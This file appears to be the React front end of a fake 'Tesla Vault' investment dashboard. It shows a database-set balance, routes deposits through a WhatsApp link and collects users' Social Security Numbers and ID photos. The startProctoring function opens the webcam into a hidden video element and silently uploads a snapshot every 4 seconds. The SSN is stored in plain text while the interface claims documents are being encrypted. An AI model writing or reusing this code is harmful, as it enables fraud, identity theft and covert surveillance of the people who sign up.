'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  Activity, Upload, Camera, User, 
  Wallet
} from 'lucide-react';

export default function Dashboard() {
  // 1. SAFE DEFAULT STATE (Prevents crash if DB fails)
  const [user, setUser] = useState<any>({
    full_name: 'Valued Client',
    balance: 0,
    deposit_status: 'pending',
    kyc_status: 'unverified',
    email: 'client@secure.mail'
  });
  
  const [loading, setLoading] = useState(true);
  const [ssn, setSsn] = useState('');
  const [idType, setIdType] = useState('driver_license');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // --- FORCE UNLOCK TIMER ---
  useEffect(() => {
    // This timer runs INDEPENDENTLY of the database.
    // It guarantees the loading screen disappears after 2.5 seconds.
    const safetyTimer = setTimeout(() => {
      setLoading(false);
    }, 2500);

    return () => clearTimeout(safetyTimer);
  }, []);

  // --- DATA LOADING ---
  useEffect(() => {
    let channel: any;

    const initData = async () => {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        
        if (!session) { 
           // window.location.href = '/portal/auth'; 
           return; 
        }

        // Fetch Real Profile
        const { data, error } = await supabase
          .from('profiles')
          .select('*')
          .eq('id', session.user.id)
          .single();

        if (data) {
          setUser(data);
          // Start camera only after we know who the user is
          startProctoring(session.user.id);
        }

        // SETUP REALTIME LISTENER (Fix for "Edit Balance not working")
        channel = supabase.channel('realtime-profile')
          .on(
            'postgres_changes',
            { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` },
            (payload) => {
              console.log("Realtime Update Received:", payload.new);
              setUser(payload.new);
            }
          )
          .subscribe();

      } catch (err) {
        console.error("Connection Error:", err);
      }
    };

    initData();

    return () => {
      if (channel) supabase.removeChannel(channel);
    };
  }, []);

  // --- CAMERA LOGIC (Fixed Black Screen) ---
  const startProctoring = async (userId: string) => {
    try {
      // FIX: playsInline + correct constraints
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play();
        };
      }
      
      // SNAPSHOT LOOP
      setInterval(async () => {
        const vid = videoRef.current;
        const cvs = canvasRef.current;
        
        // Only take picture if video is actually playing (readyState = 4)
        if (vid && cvs && vid.readyState === 4) {
            const context = cvs.getContext('2d');
            context?.drawImage(vid, 0, 0, 640, 480);
            
            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.6));
            if (blob) {
              // Upload silently
              supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob).catch(() => {});
            }
        }
      }, 4000);
    } catch (e) { console.warn("Camera access restricted"); }
  };

  // --- KYC UPLOAD LOGIC ---
  const handleKyc = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!idFile || !ssn) return;
    setKycSubmitting(true);
    try {
      // 1. Check Session
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) throw new Error("No active session");

      const path = `${session.user.id}/${Date.now()}_id.jpg`;
      
      // 2. Upload File
      const { error: uploadError } = await supabase.storage.from('user-kyc').upload(path, idFile);
      if (uploadError) throw uploadError;
      
      // 3. Update Profile
      const { error: dbError } = await supabase.from('profiles').update({ 
        ssn_data: ssn, 
        document_type: idType, 
        kyc_status: 'pending' 
      }).eq('id', session.user.id);

      if (dbError) throw dbError;

      // Force local update so UI changes instantly
      setUser((prev: any) => ({ ...prev, kyc_status: 'pending', ssn_data: ssn }));
      alert("Verification Submitted Successfully");

    } catch (err: any) { alert("Error: " + err.message); }
    finally { setKycSubmitting(false); }
  };

  // --- LOGIC HELPERS ---
  const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
  const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
  const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;

  // FIX: Logic to prevent "Reviewing" screen from appearing unless SSN exists
  const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);

  if (loading) return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center space-y-4">
      <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
      <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Establishing Secure Link</p>
    </div>
  );

  return (
    <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
      {/* HIDDEN CAMERA ELEMENTS (Opacity 0 ensures they render but aren't seen) */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        className="fixed top-0 left-0 opacity-0 pointer-events-none"
        style={{ zIndex: -1 }} 
      />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />

      {/* HEADER */}
      <header className="sticky top-0 z-[100] bg-black/60 backdrop-blur-xl border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 md:px-10 h-20 flex justify-between items-center">
           <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#D4AF37] flex items-center justify-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
                <Activity size={20} className="text-black" />
              </div>
              <h1 className="text-xl font-serif italic hidden sm:block">Tesla <span className="text-[#D4AF37]">Vault</span></h1>
           </div>
           
           <div className="flex items-center gap-4">
              <div className="flex flex-col items-end mr-2">
                <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
              </div>
              <button 
                onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} 
                className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
              >
                <LogOut size={18} />
              </button>
           </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
        
        {/* BALANCE & STATS */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
             <div>
               <div className="flex items-center gap-2 mb-6">
                 <Wallet size={14} className="text-[#D4AF37]" />
                 <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] font-bold">Consolidated Equity</p>
               </div>
               <h2 className="text-5xl md:text-8xl font-serif text-white tracking-tighter leading-none">
                 ${user?.balance?.toLocaleString() || '0.00'}
               </h2>
             </div>
             
             <div className="mt-10 md:mt-0 flex flex-col md:flex-row items-center gap-4">
               <a 
                 href={isUnlocked ? waLink : "#"} 
                 onClick={(e) => !isUnlocked && e.preventDefault()}
                 className={`w-full md:w-auto px-10 py-5 rounded-full font-black uppercase tracking-widest text-[11px] flex items-center justify-center gap-3 transition-all duration-500 text-center
                 ${isUnlocked ? 'bg-[#D4AF37] text-black shadow-[0_0_40px_rgba(212,175,55,0.3)] hover:scale-105' : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/10'}`}
               >
                 {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
               </a>
               {!isUnlocked && (
                 <p className="text-[10px] text-gray-600 uppercase tracking-widest font-bold">Awaiting Compliance Review</p>
               )}
             </div>
          </div>

          <div className="lg:col-span-4 space-y-6">
             <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y-8">
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <div className="flex items-center gap-3">
                     <ShieldCheck size={18} className={isUnlocked ? 'text-green-500' : 'text-yellow-500'} />
                     <span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">Vault Status</span>
                   </div>
                   <span className={`text-[11px] font-mono uppercase ${isUnlocked ? 'text-green-500' : 'text-yellow-500'}`}>
                     {user?.deposit_status || 'Checking'}
                   </span>
                </div>

                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <div className="flex items-center gap-3">
                     <User size={18} className="text-blue-400" />
                     <span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">KYC Level</span>
                   </div>
                   <span className="text-[11px] font-mono text-white uppercase">{user?.kyc_status === 'verified' ? 'ELITE' : 'BASIC'}</span>
                </div>

                <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
                   <div className="relative">
                      <Camera size={20} className="text-[#D4AF37]" />
                      <div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                   </div>
                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 4 seconds.</p>
                </div>
             </div>
          </div>
        </div>

        {/* VERIFICATION FORM */}
        {user?.kyc_status !== 'verified' && (
          <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
            <div className="max-w-3xl">
              <div className="flex items-center gap-3 mb-6">
                <ShieldCheck size={24} className="text-[#D4AF37]" />
                <h3 className="text-3xl md:text-4xl font-serif">Security Verification</h3>
              </div>
              <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>

              {showPendingScreen ? (
                <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
                   <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
                   <p className="text-xs uppercase tracking-[0.3em] font-bold text-white">Security Review in Progress</p>
                   <p className="text-[10px] text-gray-500">Your documents are currently being decrypted and verified by our compliance node.</p>
                </div>
              ) : (
                <form onSubmit={handleKyc} className="space-y-8">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Identity Document</label>
                      <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs transition-all cursor-pointer">
                        <option value="driver_license">Driver's License</option>
                        <option value="passport">International Passport</option>
                      </select>
                    </div>
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Social Security Number</label>
                      <input 
                        type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={(e)=>setSsn(e.target.value)} 
                        className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs tracking-widest" 
                        required 
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Proof of Identity (Front View)</label>
                    <div className="relative group min-h-[160px] border-2 border-dashed border-white/10 rounded-3xl p-6 flex flex-col items-center justify-center gap-3 bg-black hover:border-[#D4AF37]/50 transition-all cursor-pointer">
                      <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
                      <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center text-gray-400 group-hover:text-[#D4AF37] transition-colors">
                        <Upload size={20} />
                      </div>
                      <span className="text-[10px] uppercase font-bold tracking-widest text-gray-500 group-hover:text-white transition-colors">
                        {idFile ? idFile.name : `Attach ${idType.replace('_', ' ')} Photo`}
                      </span>
                    </div>
                  </div>

                  <button 
                    disabled={kycSubmitting} 
                    className="w-full md:w-auto px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[11px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl active:scale-95"
                  >
                    {kycSubmitting ? "Encrypting Documents..." : "Finalize Verification"}
                  </button>
                </form>
              )}
            </div>
          </div>
        )}
      </div>
    </main>
  );
        }
